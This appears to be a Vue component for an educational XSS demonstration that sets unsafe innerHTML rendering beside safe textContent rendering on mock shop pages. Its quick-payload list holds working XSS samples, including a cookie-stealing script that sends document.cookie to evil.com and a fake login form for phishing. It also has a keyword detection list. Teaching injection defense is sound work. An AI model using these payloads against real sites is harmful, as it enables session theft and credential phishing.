<template>
  <div class="comparison-view">
    <!-- Terminal Header -->
    <div class="terminal-header">
      <div class="terminal-dots">
        <span class="dot red"></span>
        <span class="dot yellow"></span>
        <span class="dot green"></span>
      </div>
      <div class="terminal-title">comparison_mode.exe -- Attack vs Defense</div>
    </div>

    <div class="page-header">
      <div class="glitch-title" data-text="// ATTACK vs DEFENSE">// ATTACK vs DEFENSE</div>
      <p class="subtitle">
        <span class="prompt">&gt;</span> {{ t.comparison.subtitle }}
      </p>
    </div>

    <!-- Payload Input Section -->
    <div class="cyber-card payload-card">
      <div class="card-header">
        <span class="header-icon"><i class="pi pi-bolt"></i></span>
        <span class="header-title">SELECT_PAYLOAD</span>
      </div>
      <div class="card-content">
        <div class="payload-input-row">
          <Textarea v-model="payload" :placeholder="t.comparison.payloadPlaceholder" rows="2" class="cyber-input payload-textarea" />
          <button class="execute-btn" @click="executeAttack" :disabled="!payload.trim()">
            <i class="pi pi-play"></i>
            <span>{{ t.comparison.execute }}</span>
          </button>
        </div>

        <div class="quick-payloads">
          <span class="quick-label">
            <span class="label-prefix">#</span>
            {{ t.comparison.quickPayloads }}:
          </span>
          <button v-for="p in quickPayloads" :key="p.id" class="payload-chip" :class="p.severity" @click="selectPayload(p)">
            <i :class="p.icon"></i>
            {{ p.label }}
          </button>
        </div>
      </div>
    </div>

    <!-- Side by Side Comparison -->
    <div class="comparison-grid">
      <!-- LEFT: Without Defense (Vulnerable) -->
      <div class="cyber-card side-card vulnerable-side">
        <div class="card-header danger">
          <span class="header-icon"><i class="pi pi-exclamation-triangle"></i></span>
          <span class="header-title">{{ t.comparison.withoutDefense }}</span>
          <span class="status-tag danger">
            <i class="pi pi-times-circle"></i>
            {{ t.comparison.unprotected }}
          </span>
        </div>
        <div class="card-content">
          <!-- Simulated Website -->
          <div class="fake-browser">
            <div class="browser-bar">
              <div class="browser-dots">
                <span></span><span></span><span></span>
              </div>
              <div class="browser-url">
                <i class="pi pi-lock-open"></i>
                http://vulnerable-site.com/search?q=...
              </div>
            </div>
            <div class="browser-content">
              <div class="site-header-fake">
                <h3>MyShop Online</h3>
                <div class="site-nav-fake">
                  <span>{{ t.comparison.fakeNav.home }}</span>
                  <span>{{ t.comparison.fakeNav.products }}</span>
                  <span>{{ t.comparison.fakeNav.contact }}</span>
                </div>
              </div>

              <div class="search-section-fake">
                <div class="search-box-fake">
                  <input :value="payload" readonly class="fake-input" />
                  <button class="fake-search-btn"><i class="pi pi-search"></i></button>
                </div>
              </div>

              <div class="result-section-fake" v-if="attackExecuted">
                <p class="result-label-fake">{{ t.comparison.searchResults }}:</p>
                <!--
                  EDUCATIONAL DEMO: This intentionally renders user input as HTML
                  to demonstrate XSS vulnerability. The sandbox iframe approach
                  below is used for safe demonstration.
                -->
                <div class="result-output vulnerable-output" ref="vulnOutputRef"></div>
              </div>

              <!-- Attack alert simulation -->
              <div class="attack-alert-overlay" v-if="showVulnAlert">
                <div class="attack-alert-box">
                  <div class="alert-title-bar">
                    <span>JavaScript Alert</span>
                    <button @click="showVulnAlert = false">&times;</button>
                  </div>
                  <div class="alert-body">
                    <i class="pi pi-exclamation-triangle"></i>
                    <p>{{ alertMessage }}</p>
                  </div>
                  <button class="alert-ok-btn" @click="showVulnAlert = false">OK</button>
                </div>
              </div>
            </div>
          </div>

          <!-- Explanation -->
          <div class="explanation danger-explain">
            <div class="explain-icon"><i class="pi pi-times-circle"></i></div>
            <div class="explain-text">
              <h4>{{ t.comparison.vulnExplain.title }}</h4>
              <p>{{ t.comparison.vulnExplain.desc }}</p>
              <code class="bad-code">element.innerHTML = userInput; // Howply!</code>
            </div>
          </div>

          <!-- Stolen data simulation -->
          <div class="stolen-data" v-if="attackExecuted && hasDangerousPayload">
            <div class="stolen-header">
              <i class="pi pi-exclamation-triangle"></i>
              {{ t.comparison.stolenData.title }}
            </div>
            <div class="stolen-items">
              <div class="stolen-item" v-for="item in stolenDataItems" :key="item.label">
                <span class="stolen-label">{{ item.label }}:</span>
                <span class="stolen-value">{{ item.value }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- RIGHT: With Defense (Protected) -->
      <div class="cyber-card side-card protected-side">
        <div class="card-header success">
          <span class="header-icon"><i class="pi pi-shield"></i></span>
          <span class="header-title">{{ t.comparison.withDefense }}</span>
          <span class="status-tag success">
            <i class="pi pi-check-circle"></i>
            {{ t.comparison.protected }}
          </span>
        </div>
        <div class="card-content">
          <!-- Simulated Website -->
          <div class="fake-browser protected">
            <div class="browser-bar">
              <div class="browser-dots">
                <span></span><span></span><span></span>
              </div>
              <div class="browser-url">
                <i class="pi pi-lock"></i>
                https://secure-site.com/search?q=...
              </div>
            </div>
            <div class="browser-content">
              <div class="site-header-fake">
                <h3>MyShop Online</h3>
                <div class="site-nav-fake">
                  <span>{{ t.comparison.fakeNav.home }}</span>
                  <span>{{ t.comparison.fakeNav.products }}</span>
                  <span>{{ t.comparison.fakeNav.contact }}</span>
                </div>
              </div>

              <div class="search-section-fake">
                <div class="search-box-fake">
                  <input :value="payload" readonly class="fake-input" />
                  <button class="fake-search-btn"><i class="pi pi-search"></i></button>
                </div>
              </div>

              <div class="result-section-fake" v-if="attackExecuted">
                <p class="result-label-fake">{{ t.comparison.searchResults }}:</p>
                <!-- SAFE: renders as escaped text using textContent -->
                <div class="result-output safe-output">{{ payload }}</div>
              </div>

              <!-- Defense shield animation -->
              <div class="shield-overlay" v-if="attackExecuted && hasDangerousPayload">
                <div class="shield-icon-anim">
                  <i class="pi pi-shield"></i>
                </div>
                <p>{{ t.comparison.blocked }}</p>
              </div>
            </div>
          </div>

          <!-- Explanation -->
          <div class="explanation success-explain">
            <div class="explain-icon"><i class="pi pi-check-circle"></i></div>
            <div class="explain-text">
              <h4>{{ t.comparison.safeExplain.title }}</h4>
              <p>{{ t.comparison.safeExplain.desc }}</p>
              <code class="good-code">element.textContent = userInput; // Howpsuz!</code>
            </div>
          </div>

          <!-- Defense log -->
          <div class="defense-log" v-if="attackExecuted && hasDangerousPayload">
            <div class="log-header">
              <i class="pi pi-shield"></i>
              {{ t.comparison.defenseLog.title }}
            </div>
            <div class="log-entries">
              <div class="log-entry" v-for="(entry, i) in defenseLogEntries" :key="i">
                <span class="log-time">{{ entry.time }}</span>
                <span class="log-action" :class="entry.type">{{ entry.action }}</span>
                <span class="log-detail">{{ entry.detail }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- How Defense Works -->
    <div class="cyber-card how-card">
      <div class="card-header">
        <span class="header-icon"><i class="pi pi-info-circle"></i></span>
        <span class="header-title">HOW_DEFENSE_WORKS</span>
      </div>
      <div class="card-content">
        <div class="defense-steps">
          <div class="defense-step" v-for="(step, i) in t.comparison.defenseSteps" :key="i">
            <div class="step-number">{{ i + 1 }}</div>
            <div class="step-info">
              <h4>{{ step.title }}</h4>
              <p>{{ step.desc }}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, nextTick } from 'vue'

const props = defineProps({
  t: Object,
  language: String
})

const payload = ref('')
const attackExecuted = ref(false)
const showVulnAlert = ref(false)
const alertMessage = ref('')
const vulnOutputRef = ref(null)

const quickPayloads = [
  {
    id: 'alert',
    label: 'Alert XSS',
    code: '<script>alert("XSS Attack!")<\/script>',
    icon: 'pi pi-bolt',
    severity: 'critical'
  },
  {
    id: 'img',
    label: 'IMG Onerror',
    code: '<img src=x onerror="alert(\'Hacked!\')">',
    icon: 'pi pi-image',
    severity: 'critical'
  },
  {
    id: 'cookie',
    label: 'Cookie Steal',
    code: '<script>document.location="http://evil.com/?c="+document.cookie<\/script>',
    icon: 'pi pi-key',
    severity: 'critical'
  },
  {
    id: 'deface',
    label: 'Page Deface',
    code: '<h1 style="color:red;font-size:40px">HACKED BY ATTACKER!</h1>',
    icon: 'pi pi-exclamation-triangle',
    severity: 'high'
  },
  {
    id: 'phishing',
    label: 'Fake Login',
    code: '<div style="background:#fff;padding:20px;border-radius:8px"><h3>Session Expired</h3><input placeholder="Username" style="display:block;margin:8px 0;padding:8px;width:100%"><input type="password" placeholder="Password" style="display:block;margin:8px 0;padding:8px;width:100%"><button style="background:#e00;color:#fff;padding:8px 16px;border:none;border-radius:4px;cursor:pointer">Login</button></div>',
    icon: 'pi pi-user',
    severity: 'high'
  },
  {
    id: 'svg',
    label: 'SVG XSS',
    code: '<svg onload="alert(\'SVG XSS!\')">',
    icon: 'pi pi-code',
    severity: 'medium'
  }
]

const hasDangerousPayload = computed(() => {
  const p = payload.value.toLowerCase()
  return p.includes('<script') || p.includes('onerror') || p.includes('onload') ||
    p.includes('alert(') || p.includes('document.') || p.includes('javascript:') ||
    p.includes('<img') || p.includes('<svg') || p.includes('<iframe') ||
    p.includes('onclick') || p.includes('<h1') || p.includes('<div')
})

const stolenDataItems = computed(() => [
  { label: 'Cookie', value: 'session_id=abc123xyz; auth_token=eyJhbGc...' },
  { label: 'IP Address', value: '192.168.1.105' },
  { label: 'Browser', value: 'Chrome 120.0 / Windows 11' },
  { label: 'Location', value: 'Ashgabat, Turkmenistan' },
])

const defenseLogEntries = computed(() => {
  const now = new Date()
  const fmt = (s) => {
    const d = new Date(now.getTime() + s * 1000)
    return d.toTimeString().split(' ')[0]
  }
  return [
    { time: fmt(0), type: 'detect', action: 'DETECT', detail: props.t.comparison.defenseLog.detected },
    { time: fmt(0), type: 'block', action: 'BLOCK', detail: props.t.comparison.defenseLog.blocked },
    { time: fmt(1), type: 'sanitize', action: 'SANITIZE', detail: props.t.comparison.defenseLog.sanitized },
    { time: fmt(1), type: 'log', action: 'LOG', detail: props.t.comparison.defenseLog.logged },
  ]
})

function selectPayload(p) {
  payload.value = p.code
  attackExecuted.value = false
  showVulnAlert.value = false
}

function executeAttack() {
  if (!payload.value.trim()) return
  attackExecuted.value = true

  // Use sandboxed iframe approach for the vulnerable side demo
  // This safely demonstrates what innerHTML would render
  nextTick(() => {
    if (vulnOutputRef.value) {
      // Create a sandboxed iframe to render the vulnerable output
      const iframe = document.createElement('iframe')
      iframe.sandbox = 'allow-same-origin' // No allow-scripts: scripts won't execute
      iframe.style.cssText = 'width:100%;border:none;min-height:60px;background:#fff0f0;border-radius:4px;'
      vulnOutputRef.value.replaceChildren(iframe)

      // Write the payload into the sandboxed iframe
      const doc = iframe.contentDocument || iframe.contentWindow.document
      doc.open()
      doc.write(`
        <html>
        <head><style>body{font-family:system-ui;font-size:14px;margin:8px;color:#333;}</style></head>
        <body>${payload.value}</body>
        </html>
      `)
      doc.close()

      // Auto-resize iframe
      setTimeout(() => {
        try {
          iframe.style.height = Math.max(60, doc.body.scrollHeight + 16) + 'px'
        } catch(e) {}
      }, 100)
    }
  })

  // Simulate alert for the vulnerable side
  if (hasDangerousPayload.value) {
    setTimeout(() => {
      const p = payload.value.toLowerCase()
      if (p.includes('alert(')) {
        const match = payload.value.match(/alert\(['"]?([^'")\]]+)['"]?\)/)
        alertMessage.value = match ? match[1] : 'XSS Attack!'
      } else {
        alertMessage.value = 'XSS Code Executed!'
      }
      showVulnAlert.value = true
    }, 500)
  }
}
</script>

<style scoped>
.comparison-view {
  max-width: 1400px;
  margin: 0 auto;
  padding: 1rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

/* Terminal header */
.terminal-header {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 0.6rem 1rem;
  background: #1a1a2e;
  border: 1px solid #2a2a4a;
  border-radius: 8px 8px 0 0;
}

.terminal-dots {
  display: flex;
  gap: 6px;
}

.dot {
  width: 12px;
  height: 12px;
  border-radius: 50%;
}

.dot.red { background: #ff5f57; }
.dot.yellow { background: #ffbd2e; }
.dot.green { background: #28c840; }

.terminal-title {
  font-family: 'JetBrains Mono', 'Fira Code', monospace;
  font-size: 0.85rem;
  color: #8b8baf;
}

/* Page header */
.page-header {
  text-align: center;
  margin-bottom: 0.5rem;
}

.glitch-title {
  font-family: 'JetBrains Mono', monospace;
  font-size: 2rem;
  font-weight: 700;
  color: #00ff88;
  text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
}

.subtitle {
  font-family: monospace;
  color: #8b8baf;
  font-size: 0.95rem;
}

.prompt { color: #00ff88; }

/* Cyber cards */
.cyber-card {
  background: #0d0d1a;
  border: 1px solid #2a2a4a;
  border-radius: 8px;
  overflow: hidden;
}

.card-header {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  padding: 0.75rem 1rem;
  background: #1a1a2e;
  border-bottom: 1px solid #2a2a4a;
  font-family: monospace;
  font-size: 0.85rem;
  color: #00ff88;
}

.card-header.danger { color: #ff4444; border-bottom-color: rgba(255, 68, 68, 0.3); }
.card-header.success { color: #00ff88; border-bottom-color: rgba(0, 255, 136, 0.3); }

.header-icon { font-size: 1.1rem; }
.header-title { flex: 1; }

.card-content { padding: 1.25rem; }

/* Payload section */
.payload-input-row {
  display: flex;
  gap: 1rem;
  align-items: flex-start;
}

.payload-textarea { flex: 1; }

.cyber-input {
  background: #111128 !important;
  border: 1px solid #2a2a4a !important;
  color: #e0e0ff !important;
  font-family: monospace !important;
}

.execute-btn {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  padding: 0.75rem 1.5rem;
  background: linear-gradient(135deg, #ff4444, #cc0000);
  color: white;
  border: none;
  border-radius: 6px;
  font-family: monospace;
  font-weight: 600;
  font-size: 0.9rem;
  cursor: pointer;
  white-space: nowrap;
  transition: all 0.3s;
}

.execute-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 5px 20px rgba(255, 68, 68, 0.4);
}

.execute-btn:disabled { opacity: 0.5; cursor: not-allowed; }

.quick-payloads {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  flex-wrap: wrap;
  margin-top: 1rem;
}

.quick-label {
  color: #8b8baf;
  font-family: monospace;
  font-size: 0.8rem;
}

.label-prefix { color: #00ff88; }

.payload-chip {
  padding: 0.35rem 0.75rem;
  border: 1px solid #2a2a4a;
  border-radius: 20px;
  background: #1a1a2e;
  color: #ccc;
  font-size: 0.75rem;
  font-family: monospace;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 0.35rem;
  transition: all 0.2s;
}

.payload-chip:hover { border-color: #ff4444; color: #ff4444; }
.payload-chip.critical { border-color: rgba(255, 68, 68, 0.3); }
.payload-chip.high { border-color: rgba(255, 165, 0, 0.3); }
.payload-chip.medium { border-color: rgba(255, 215, 0, 0.3); }

/* Comparison Grid */
.comparison-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.5rem;
}

.status-tag {
  display: flex;
  align-items: center;
  gap: 0.35rem;
  padding: 0.25rem 0.65rem;
  border-radius: 20px;
  font-size: 0.7rem;
  font-weight: 600;
}

.status-tag.danger {
  background: rgba(255, 68, 68, 0.15);
  color: #ff4444;
  border: 1px solid rgba(255, 68, 68, 0.3);
}

.status-tag.success {
  background: rgba(0, 255, 136, 0.15);
  color: #00ff88;
  border: 1px solid rgba(0, 255, 136, 0.3);
}

/* Fake browser */
.fake-browser {
  border: 1px solid #2a2a4a;
  border-radius: 8px;
  overflow: hidden;
  background: #fff;
  position: relative;
}

.fake-browser.protected { border-color: rgba(0, 255, 136, 0.3); }

.browser-bar {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  padding: 0.5rem 0.75rem;
  background: #f0f0f0;
  border-bottom: 1px solid #ddd;
}

.browser-dots {
  display: flex;
  gap: 4px;
}

.browser-dots span {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #ccc;
}

.browser-dots span:nth-child(1) { background: #ff5f57; }
.browser-dots span:nth-child(2) { background: #ffbd2e; }
.browser-dots span:nth-child(3) { background: #28c840; }

.browser-url {
  flex: 1;
  padding: 0.3rem 0.6rem;
  background: white;
  border-radius: 4px;
  font-size: 0.75rem;
  color: #666;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-family: system-ui;
}

.vulnerable-side .browser-url .pi-lock-open { color: #ff4444; }
.protected-side .browser-url .pi-lock { color: #28c840; }

.browser-content {
  padding: 1rem;
  min-height: 250px;
  position: relative;
}

.site-header-fake {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-bottom: 0.75rem;
  border-bottom: 2px solid #4a90d9;
  margin-bottom: 1rem;
}

.site-header-fake h3 {
  color: #333;
  font-size: 1.1rem;
  margin: 0;
}

.site-nav-fake {
  display: flex;
  gap: 1rem;
  font-size: 0.8rem;
  color: #666;
}

.search-section-fake { margin-bottom: 1rem; }

.search-box-fake { display: flex; }

.fake-input {
  flex: 1;
  padding: 0.5rem 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px 0 0 4px;
  font-size: 0.85rem;
  color: #333;
  background: #fafafa;
}

.fake-search-btn {
  padding: 0.5rem 1rem;
  background: #4a90d9;
  color: white;
  border: none;
  border-radius: 0 4px 4px 0;
  cursor: default;
}

.result-label-fake {
  font-size: 0.85rem;
  color: #666;
  margin-bottom: 0.5rem;
}

.result-output {
  padding: 0.75rem;
  border-radius: 4px;
  font-size: 0.9rem;
  min-height: 40px;
  word-break: break-all;
}

.vulnerable-output {
  background: #fff0f0;
  border: 1px solid #ffcccc;
  color: #333;
}

.safe-output {
  background: #f0fff4;
  border: 1px solid #ccffdd;
  color: #333;
  white-space: pre-wrap;
}

/* Attack alert simulation */
.attack-alert-overlay {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10;
  animation: fadeIn 0.3s ease;
}

.attack-alert-box {
  background: #f0f0f0;
  border-radius: 8px;
  width: 280px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
  overflow: hidden;
}

.alert-title-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0.5rem 0.75rem;
  background: #e0e0e0;
  font-size: 0.8rem;
  font-weight: 600;
  color: #333;
}

.alert-title-bar button {
  background: none;
  border: none;
  font-size: 1.2rem;
  cursor: pointer;
  color: #666;
}

.alert-body {
  padding: 1.5rem;
  text-align: center;
}

.alert-body i {
  font-size: 2rem;
  color: #ff9800;
  margin-bottom: 0.75rem;
  display: block;
}

.alert-body p { color: #333; font-size: 0.95rem; margin: 0; }

.alert-ok-btn {
  display: block;
  width: calc(100% - 2rem);
  margin: 0 1rem 1rem;
  padding: 0.5rem;
  background: #4a90d9;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 600;
}

/* Shield overlay */
.shield-overlay {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  text-align: center;
  z-index: 5;
  animation: shieldPulse 0.5s ease;
}

.shield-icon-anim {
  width: 60px;
  height: 60px;
  background: rgba(0, 255, 136, 0.15);
  border: 2px solid rgba(0, 255, 136, 0.5);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 0.75rem;
  animation: shieldBounce 0.6s ease;
}

.shield-icon-anim i { font-size: 1.8rem; color: #00ff88; }

.shield-overlay p {
  color: #00ff88;
  font-family: monospace;
  font-weight: 600;
  font-size: 0.85rem;
  text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
}

/* Explanation boxes */
.explanation {
  display: flex;
  gap: 1rem;
  padding: 1rem;
  border-radius: 8px;
  margin-top: 1rem;
}

.danger-explain {
  background: rgba(255, 68, 68, 0.05);
  border: 1px solid rgba(255, 68, 68, 0.2);
}

.success-explain {
  background: rgba(0, 255, 136, 0.05);
  border: 1px solid rgba(0, 255, 136, 0.2);
}

.explain-icon { font-size: 1.5rem; flex-shrink: 0; }

.danger-explain .explain-icon { color: #ff4444; }
.success-explain .explain-icon { color: #00ff88; }

.explain-text h4 { margin: 0 0 0.35rem; font-size: 0.9rem; color: #e0e0ff; }
.explain-text p { margin: 0 0 0.5rem; font-size: 0.8rem; color: #8b8baf; }

.bad-code, .good-code {
  display: block;
  padding: 0.4rem 0.75rem;
  border-radius: 4px;
  font-size: 0.75rem;
  font-family: monospace;
}

.bad-code {
  background: rgba(255, 68, 68, 0.1);
  color: #ff6666;
  border: 1px solid rgba(255, 68, 68, 0.2);
}

.good-code {
  background: rgba(0, 255, 136, 0.1);
  color: #00ff88;
  border: 1px solid rgba(0, 255, 136, 0.2);
}

/* Stolen data */
.stolen-data {
  margin-top: 1rem;
  border: 1px solid rgba(255, 68, 68, 0.3);
  border-radius: 8px;
  overflow: hidden;
  animation: fadeIn 0.5s ease;
}

.stolen-header {
  padding: 0.6rem 1rem;
  background: rgba(255, 68, 68, 0.15);
  color: #ff4444;
  font-family: monospace;
  font-size: 0.8rem;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.stolen-items { padding: 0.75rem 1rem; }

.stolen-item {
  display: flex;
  gap: 0.5rem;
  padding: 0.35rem 0;
  font-size: 0.75rem;
  font-family: monospace;
  border-bottom: 1px solid #1a1a2e;
}

.stolen-item:last-child { border-bottom: none; }
.stolen-label { color: #8b8baf; }
.stolen-value { color: #ff6666; }

/* Defense log */
.defense-log {
  margin-top: 1rem;
  border: 1px solid rgba(0, 255, 136, 0.3);
  border-radius: 8px;
  overflow: hidden;
  animation: fadeIn 0.5s ease;
}

.log-header {
  padding: 0.6rem 1rem;
  background: rgba(0, 255, 136, 0.1);
  color: #00ff88;
  font-family: monospace;
  font-size: 0.8rem;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.log-entries { padding: 0.5rem 1rem; }

.log-entry {
  display: flex;
  gap: 0.75rem;
  padding: 0.3rem 0;
  font-size: 0.75rem;
  font-family: monospace;
  align-items: center;
}

.log-time { color: #555; }

.log-action {
  padding: 0.15rem 0.5rem;
  border-radius: 3px;
  font-weight: 600;
  font-size: 0.65rem;
}

.log-action.detect { background: rgba(255, 165, 0, 0.15); color: #ffa500; }
.log-action.block { background: rgba(255, 68, 68, 0.15); color: #ff4444; }
.log-action.sanitize { background: rgba(0, 136, 255, 0.15); color: #0088ff; }
.log-action.log { background: rgba(0, 255, 136, 0.15); color: #00ff88; }

.log-detail { color: #8b8baf; }

/* Defense steps */
.defense-steps {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 1rem;
}

.defense-step {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  padding: 1.25rem;
  background: #1a1a2e;
  border-radius: 8px;
  border: 1px solid #2a2a4a;
}

.step-number {
  width: 40px;
  height: 40px;
  background: linear-gradient(135deg, #00ff88, #00cc66);
  color: #0d0d1a;
  font-weight: 700;
  font-size: 1.2rem;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 0.75rem;
}

.step-info h4 { color: #e0e0ff; font-size: 0.85rem; margin: 0 0 0.35rem; }
.step-info p { color: #8b8baf; font-size: 0.75rem; margin: 0; }

/* Animations */
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

@keyframes shieldPulse {
  0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
  100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
}

@keyframes shieldBounce {
  0% { transform: scale(0); }
  50% { transform: scale(1.2); }
  100% { transform: scale(1); }
}

/* Responsive */
@media (max-width: 1024px) {
  .comparison-grid { grid-template-columns: 1fr; }
  .defense-steps { grid-template-columns: repeat(2, 1fr); }
}

@media (max-width: 768px) {
  .glitch-title { font-size: 1.4rem; }
  .payload-input-row { flex-direction: column; }
  .execute-btn { width: 100%; justify-content: center; }
  .defense-steps { grid-template-columns: 1fr; }
  .site-nav-fake { display: none; }
  .comparison-view { padding: 0.5rem; }
}

@media (max-width: 480px) {
  .glitch-title { font-size: 1.1rem; }
  .terminal-title { display: none; }
  .card-content { padding: 0.75rem; }
}
</style>
